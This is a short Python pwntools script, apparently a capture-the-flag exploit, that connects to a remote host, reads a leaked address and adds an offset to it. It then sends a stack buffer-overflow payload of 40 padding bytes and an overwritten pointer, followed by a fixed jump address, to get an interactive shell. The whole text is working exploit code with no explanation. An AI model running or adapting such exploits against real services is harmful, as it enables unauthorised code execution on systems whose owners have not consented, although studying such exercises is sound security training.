from pwn import *

r = remote('109.233.56.90',11604)

win = r.recvuntil('U: ')
win2 = r.recvuntil(' P')
#print(win2)
#win2 = win2.decode()
win2 = win2[:-2]
win2 = win2.decode()
win2 = int(win2,16)
print(win2)
print(win2 + 56)
win3 = hex(win2+56)
print(int(win3,16))
payload = b'A'*40+p64(int(win3,16))
print(p64(int(win3,16)))

r.send(payload)
r.recv()
r.send(p64(0x401182))
r.recv()
r.interactive()

